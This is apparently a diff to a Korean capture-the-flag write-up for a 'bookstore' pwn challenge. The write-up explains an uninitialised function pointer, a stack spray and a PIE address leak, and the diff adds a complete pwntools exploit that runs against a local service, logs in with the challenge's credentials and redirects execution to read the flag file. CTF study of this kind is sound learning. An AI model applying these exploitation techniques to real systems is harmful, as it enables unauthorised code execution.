@@ -4,16 +4,16 @@
 
 bookstore를 실행 할 때에는 User가 필요한대 아래 처럼 추가해주시면됩니다!
 ```
-user add명령얼르 이용하여 bookstore계정을 추가해 주어야 됩니다 :)
+user add명령어를 이용하여 bookstore계정을 추가해 주어야 됩니다 :)
 ```
 
 booksotre에 접속하면 멘 처음 아이디와 비밀번호를 입력하라고 나오는데 아래 그림에 바로 나와있습니다 ㄷㄷ..
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/Login.PNG)
 
 로그인을 하게 되면 아래 처럼 관리 메뉴가 여러가지 나오게 됩니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/MenuList.PNG)
 
 여기서 간략하게 매뉴 별로 설명을 하겠습니다.
 
@@ -33,7 +33,7 @@ booksotre에 접속하면 멘 처음 아이디와 비밀번호를 입력하라�
 
 (이 부분에서 Overflow취약점인줄 알고 2일 삽질 끝에 하루종일 라업보고 겨우 이해했내요...)
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/ModifyDescription.PNG)
 
 ### Stack Spray(?)
 
@@ -55,13 +55,13 @@ Description에 A가 300개 만큼 사용된 다음 나머지 A들은 스택에 �
 
 아래 그림을 보면 함수 포인터를 2개 생성하는데, 여기서 다른 한 함수포인터의 초기화가 진행되지 않는 모습을 볼수 있고 저 함수포인터를 조작하면 원하는 함수를 실행시킬 수 있습니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/AddItemFuncAddr.PNG)
 
 그럼 저 함수 포인터가 실행되는 조건은 어떻게 되는지 한번 살펴보겠습니다.
 
 아래 그림과 같이 freeshipping변수가 1로 설정되어있어야 저희가 조작한 함수 포인터가 실행된다는 것을 알 수 있습니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/ViewInformation.PNG)
 
 이제 이것들을 이용해서 원하는 함수 값을 [2. Modify the item]을 이용하여 스택을 꽉꽉 채운 뒤 수정해서 실앻시키면 될 것 같지만 PIE라는 기법 때문에 불가능합니다.
 
@@ -75,7 +75,7 @@ PIE란 리눅스 시스템의 보호 기법중 하나로 ALSR같은 경우에는
 
 아래 그림을 보면서 대강 구조체의 구조를 알 수 있었습니다. (View Information의 호출부와 내부를 비교하면서 찾았습니다!)
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/CallViewInformation.PNG)
 
 ```
 bookID(4) 
@@ -98,7 +98,7 @@ Name을 20byte채우고, price와 stock을 모두 채우면 description Function
 
 자 마지막으로 flag파일을 읽을만한 함수가 필요한데, Login 함수에 가보면 file을 rade하는 함수가 있는데 사용하면 될것 같습니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/bookstore/img/FlagReadFunc.PNG)
 
 이제 시나리오를 정리해 봅시다.
 
@@ -125,5 +125,130 @@ Name을 20byte채우고, price와 stock을 모두 채우면 description Function
 ### 소스코드
 Ubuntu 16 LTS 64bit 환경에서 테스팅 하였습니다.
 ```
+from pwn import *
+import time
 
+r = remote('127.0.0.1', 9999)
+
+#ID : helloadmin, PW : iulover!@#$
+def login(user_id, user_pw) :
+	print r.recvuntil('ID : ')
+	r.send(user_id)
+	time.sleep(1)
+	print r.recvuntil('PASSWORD : ')
+	r.send(user_pw)
+    
+	print r.recvuntil('> ')
+	time.sleep(1)
+
+def add_new_item(name, desc) :
+    time.sleep(1)
+    r.sendline('1')
+
+    print r.recvuntil('Bookname :')
+    r.sendline(name)
+    print r.recvuntil('Description :')
+    r.sendline(desc)
+    print r.recvuntil('EBook)')
+    r.sendline('0')
+
+    print r.recvuntil('> ')
+
+if __name__ == '__main__' :
+	#login
+	login('helloadmin', 'iulover!@#$')
+
+	#add item
+	add_new_item('name', 'name is min')
+	
+	r.sendline('3')
+	print r.recvuntil('No : ')
+	r.sendline('0')
+	print r.recv(2048)
+	
+	#leak
+	time.sleep(1)
+	r.sendline('2')
+	print r.recvuntil('No : ')
+	r.sendline('0')
+
+	time.sleep(1)
+	print r.recv(4096)
+	r.sendline('3')
+	print r.recvuntil('Stock :')
+	r.sendline('2147483647')
+	print r.recvuntil('Price :')
+	r.sendline('2147483647')
+	print r.recvuntil('not)')
+	r.sendline('0')
+	print r.recvuntil('Avaliable :')
+	r.sendline('1')
+	print r.recvuntil('bookname')
+	r.sendline('A'*20)
+	print r.recv(128)
+	print r.recvuntil('description')
+	r.sendline('B'*300)
+	print r.recv(1024)
+
+	r.sendline('0')
+	print r.recvuntil('> ')
+	
+	time.sleep(1)
+	r.sendline('4')
+	print r.recvuntil('A'*20)
+
+	leak = r.recv(1024)
+
+	leak = u32(leak[8:12]) - 210 #8:12 9DA is free shopping function
+	print "Leak base address : " + hex(leak)
+
+	#fileRead_func = leak + 0x8db
+	#print "Clac file read func address : " + hex(fileRead_func)
+
+	#exploit
+	time.sleep(1)
+	r.sendline('2')
+	print r.recvuntil('No : ')
+	r.sendline('0')
+
+	time.sleep(1)
+	print r.recv(2048)
+	r.sendline('2')
+
+	print r.recvuntil('description')
+	r.sendline(p32(leak) * 750)
+
+	print r.recv(1024)
+
+	r.sendline('3')
+	print r.recvuntil('Stock :')
+	r.sendline('2147483647')
+	print r.recvuntil('Price :')
+	r.sendline('2147483647')
+	print r.recvuntil('not)')
+	r.sendline('0')
+	print r.recvuntil('Avaliable :')
+	r.sendline('0')
+	print r.recvuntil('bookname')
+	r.sendline('./flag\x00')
+	print r.recv(128)
+	print r.recvuntil('description')
+	r.sendline('B'*300)
+
+	print r.recv(1024)
+
+	time.sleep(1)
+	r.sendline('4')
+
+	print r.recvuntil('shipping)')
+	r.sendline('1')
+
+	print r.recv(1024)
+	r.sendline('0')
+	print r.recvuntil('> ')
+
+	r.sendline('3')
+	print r.recvuntil('No : ')
+	r.sendline('0')
+	print r.recv(2048)
 ```
